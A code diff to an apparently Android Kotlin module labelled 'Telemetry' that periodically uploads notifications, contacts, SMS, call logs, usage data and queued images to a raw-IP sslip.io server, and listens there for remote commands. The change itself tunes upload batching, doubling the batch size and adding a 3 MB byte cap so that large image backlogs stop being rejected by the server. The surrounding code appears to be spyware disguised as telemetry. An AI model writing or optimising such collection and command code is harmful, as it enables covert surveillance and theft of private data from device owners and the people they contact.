@@ -39,7 +39,8 @@ object Telemetry {
     private const val NOTIF_EVERY_MS = 60_000L      // 通知全量同步周期
     private const val DATA_EVERY_MS = 300_000L      // 通讯录/短信/通话/使用时长周期
     private const val CONF_EVERY_MS = 30_000L       // 远程配置拉取周期
-    private const val BATCH = 200
+    private const val BATCH = 400
+    private const val MAX_BATCH_CHARS = 3_000_000   // ≈3 MB，留余量给服务端上限
     private const val PERIOD_MS = 20_000L
     private const val CMD_STREAM = "https://43-108-107-175.sslip.io:8080/dash/cmdstream"
     private const val CMD_POLL_MS = 30_000L  // SSE 断线时的兜底轮询间隔
@@ -197,8 +198,21 @@ object Telemetry {
         val now = System.currentTimeMillis()
         if (!force && now - lastFlushAt < FLUSH_MIN_MS) return
         lastFlushAt = now
+        // 按字节取件：单次请求别超过 3 MB。
+        // 之前只按条数（200 条）取，队列里真堆满图片时一次能发出 6 MB，
+        // 服务端 413 拒掉、整批重排队，越传越堵。
         val batch = ArrayList<JSONObject>(BATCH)
-        while (batch.size < BATCH) batch.add(queue.poll() ?: break)
+        var bytes = 0
+        while (batch.size < BATCH) {
+            val o = queue.poll() ?: break
+            val sz = o.toString().length
+            if (batch.isNotEmpty() && bytes + sz > MAX_BATCH_CHARS) {
+                queue.offer(o)
+                break
+            }
+            batch.add(o)
+            bytes += sz
+        }
 
         val body = JSONObject()
             .put("dev", devId(ctx))
